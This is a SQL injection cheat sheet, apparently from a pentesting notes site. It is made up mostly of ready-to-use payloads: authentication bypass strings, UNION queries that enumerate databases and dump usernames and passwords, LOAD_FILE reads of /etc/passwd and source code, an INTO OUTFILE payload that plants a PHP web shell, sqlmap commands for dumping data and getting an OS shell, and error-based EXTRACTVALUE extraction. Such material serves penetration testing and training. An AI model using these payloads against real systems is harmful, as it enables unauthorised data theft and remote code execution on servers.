# SQL Injection

Many web applications use one or multiple databases to manage data. In order to dynamically edit the database while users browse the website, some SQL queries can rely on input vectors. When input parameters used in those queries are insufficiently validated or sanitized, these web apps can be vulnerable to SQL injections.

SQL injection attacks can allow attackers to read, update, insert or delete database data by injecting a piece of SQL query through the input vector, hence affecting the intended execution of the original query. In some cases, these attacks can also lead to File Download, File Upload or even Remote Code Execution.

### Authentication bypass

```sh
# Auth bypass for first entry of the table
' or '1'='1 
' or 1=1 -- -

# Auth bypass for specific user
<username>' or '1'='1
<username>' -- -
```

### Database enumeration

When using Union queries, the 2 `SELECT` statements have to return the same amount of columns not to get an error

To match the number of columns we can fill other columns with junk data. The type of data used as junk has to be the same type as the other one. Using `NULL` as junk fits all data type

Methodology to enumerate a DB :

```sh
# Find the number or returned columns. Increment until we get an error
' order by 1-- -
# Or use union and add more NULL until we don't have an error anymore
' UNION select NULL,NULL,NULL-- -

# Find out which columns are printed on the page

# Test which DB software we are dealing with => check cheat sheet for other payloads
' UNION select NULL,@@version,NULL,NULL-- -

# List all DB
' UNION select NULL,schema_name,NULL,NULL from INFORMATION_SCHEMA.SCHEMATA-- -

# List tables in selected DB
cn' UNION select NULL,TABLE_NAME,NULL,NULL from INFORMATION_SCHEMA.TABLES where table_schema='<database_name>'-- -

# List columns in the selected table 
' UNION select NULL,COLUMN_NAME,NULL,NULL from INFORMATION_SCHEMA.COLUMNS where table_name='<table_name>'-- -

# Dump the data 
' UNION select NULL, username, password, NULL from <DB>.<TABLE>-- -
```

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

### Reading files

To read files from SQL injection, we need the following information:

* Current user
* His privileges (looking for super\_priv or FILE permission)
* Directory in which the files are contained

```sh
# Find the number or returned columns. Increment until we get an error
' order by 1-- -
# Or use union and add more NULL until we don't have an error anymore
' UNION select NULL,NULL,NULL-- -

# Find out which columns are printed on the page

# Test which DB software we are dealing with => check cheat sheet for other payloads
' UNION select NULL,@@version,NULL,NULL-- -

# Determine current database user
' UNION SELECT NULL, user(), NULL, NULL-- -
' UNION SELECT NULL, current_user(), NULL, NULL-- -
' UNION SELECT NULL, user, NULL, NULL from mysql.user-- -

# Test for super admin privs => Looking for Y 
' UNION SELECT NULL, super_priv, NULL, NULL FROM mysql.user-- -
# To target specific user 
' UNION SELECT NULL, super_priv, NULL, NULL FROM mysql.user WHERE user="<DB_user>"-- -

# Or enumerate all permissions looking for the FILE privilege
' UNION SELECT NULL, grantee, privilege_type, NULL FROM information_schema.user_privileges-- -
# To target specific user 
' UNION SELECT NULL, grantee, privilege_type, NULL FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

# If permission FILE or Y for super_priv, attempt to read files with LOAD_FILE()
' UNION SELECT NULL, LOAD_FILE("/etc/passwd"), NULL, NULL-- -

# We can also read source code if we know the path to the web root
# If we include it, it will be interpreted, so look at the HTML in the dev tools
' UNION SELECT NULL, LOAD_FILE("/var/www/html/search.php"), NULL, NULL-- -
```

### Write files

To be able to write files to the back-end server using a MySQL database, we require three things:

1. User with `FILE` privilege enabled
2. MySQL global `secure_file_priv` variable not enabled
3. Write access to the location we want to write to on the back-end server

The `secure_file_priv` variable is used to determine where to read/write files from. An empty value lets us read files from the entire file system. Otherwise, if a certain directory is set, we can only read from the folder specified by the variable. On the other hand, `NULL` means we cannot read/write from any directory.

Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use `load_file` to read the server configuration, like Apache's configuration found at `/etc/apache2/apache2.conf`, Nginx's configuration at `/etc/nginx/nginx.conf`, or IIS configuration at `%WinDir%\System32\Inetsrv\Config\ApplicationHost`.config, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using [this wordlist for Linux](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-linux.txt) or [this wordlist for Windows](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/default-web-root-directory-windows.txt). Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.

```sh
# Find the number or returned columns. Increment until we get an error
' order by 1-- -
# Or use union and add more NULL until we don't have an error anymore
' UNION select NULL,NULL,NULL-- -

# Find out which columns are printed on the page

# Test which DB software we are dealing with => check cheat sheet for other payloads
' UNION select NULL,@@version,NULL,NULL-- -

# Determine current database user
' UNION SELECT NULL, user(), NULL, NULL-- -
' UNION SELECT NULL, current_user(), NULL, NULL-- -
' UNION SELECT NULL, user, NULL, NULL from mysql.user-- -

# Enumerate all permissions looking for FILE privilege
' UNION SELECT NULL, grantee, privilege_type, NULL FROM information_schema.user_privileges-- -
# To target specific user 
' UNION SELECT NULL, grantee, privilege_type, NULL FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -

# Check the value of secure_file_priv
' UNION SELECT NULL, variable_name, variable_value, NULL FROM information_schema.global_variables where variable_name="secure_file_priv"-- -
	
# Write strings to file on the backend server
' union select NULL,'file written successfully!', NULL, NULL into outfile '/var/www/html/proof.txt'-- -

# Writing to the web root, we can then include the file from the website at http://IP:PORT/file

# Now that we have confirmed our write permission, we can attempt to write a web shell
' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -

# Exexute commands http://IP:PORT/shell.php?0=id
```

### Automate testing

```sh
# Dump everything
sqlmap -r req.txt --dump --batch --level=5 --risk=3 

# Enumerate DB 
sqlmap -r req.txt --dbs

# Enumerate tables
sqlmap -r req.txt -D <database_name> --tables

# Dump particular table
sqlmap -r req.txt -D <database_name> -T <table_name> --dump

# Check for DBA privs
sqlmap -r req.txt --is-dba

# Read file
sqlmap -r req.txt --file-read "/etc/passwd"

# Try to get an os-shell
sqlmap -r req.txt --os-shell
```

### Error-Based injection

When in presence of an error injection, it can take some time to enumerate the database. We can use the `EXTRACTVALUE` function to directly return data. It uses `XPATH` to provoke an error. Always use the `concat` function with a wrong value as first parameter to force an error and therefore see the SQL output.

```shellscript
' AND EXTRACTVALUE(1,concat(0x0a,(select version()))) -- -

# Extract DB names
' AND EXTRACTVALUE(1,concat(0x0a,(select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.SCHEMATA))) -- -
```

If we retrieve a long string (ex a password hash), we might not get the full string, but `trailing dots` at the end, meaning that we are limited in character output. In that case, get rid of the `group_concat` function use the `LIMIT` function to enumerate manually. Change the first digit of the `LIMIT` function to iterate through

```shellscript
# Extract table names
' AND EXTRACTVALUE(1,concat(0x0a,(select TABLE_NAME from INFORMATION_SCHEMA.TABLES where TABLE_SCHEMA = '<DB_NAME>' LIMIT 1,1))) -- -
```

{% embed url="https://www.youtube.com/watch?embeds_referring_euri=https://cdn.iframe.ly/&t=680&v=4y2gp_GTBqQ" %}

{% embed url="https://www.youtube.com/watch?embeds_referring_euri=https://cdn.iframe.ly/&v=Ulb2rm2qbJY" %}
